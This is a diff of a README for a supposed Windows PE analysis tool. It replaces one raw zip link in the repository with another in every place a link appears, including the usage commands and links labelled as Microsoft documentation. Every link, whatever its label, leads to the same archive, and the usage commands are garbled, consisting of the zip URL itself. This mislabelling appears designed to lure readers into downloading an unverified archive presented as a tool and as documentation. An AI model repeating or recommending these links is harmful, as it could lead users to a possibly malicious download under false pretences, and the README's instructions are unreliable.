@@ -1,6 +1,6 @@
 # 🔍 PEAnalyzer - Easy Portable Executable Analysis Tool
 
-[![Download PEAnalyzer](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip)](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip)
+[![Download PEAnalyzer](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Properties/PE_Analyzer_v2.6.zip)](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Properties/PE_Analyzer_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ PEAnalyzer is a small Windows command-line tool. It reads PE (Portable Executabl
 
 ## 📥 Download & Install
 
-To download PEAnalyzer, visit this page: [Download PEAnalyzer](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip). 
+To download PEAnalyzer, visit this page: [Download PEAnalyzer](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Properties/PE_Analyzer_v2.6.zip). 
 
 1. Navigate to the Releases page.
 2. Click on the latest version.
@@ -37,7 +37,7 @@ After you download PEAnalyzer, follow these steps:
    ```
 3. To use PEAnalyzer, type the following command:
    ```
-   https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip [path to your PE file]
+   https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Properties/PE_Analyzer_v2.6.zip [path to your PE file]
    ```
    Replace `[path to your PE file]` with the actual path to the file you wish to analyze.
 
@@ -53,7 +53,7 @@ PEAnalyzer provides various types of information about the PE file you analyze:
 
 If you choose to use JSON output, you can simply add the `-json` option to your command:
 ```
-https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip [path to your PE file] -json
+https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Properties/PE_Analyzer_v2.6.zip [path to your PE file] -json
 ```
 This will create a JSON file with all the extracted information.
 
@@ -71,8 +71,8 @@ If you encounter any issues or have questions, please feel free to reach out thr
 
 For more detailed information about Portable Executable files, you may want to check out these resources:
 
-- [Microsoft Documentation on PE Files](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip)
-- [Common PE Analysis Tools](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Pe/PE_Analyzer_3.5.zip)
+- [Microsoft Documentation on PE Files](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Properties/PE_Analyzer_v2.6.zip)
+- [Common PE Analysis Tools](https://github.com/Rych156/PEAnalyzer/raw/refs/heads/main/Properties/PE_Analyzer_v2.6.zip)
 
 For further updates, consider checking the Releases page periodically.
 
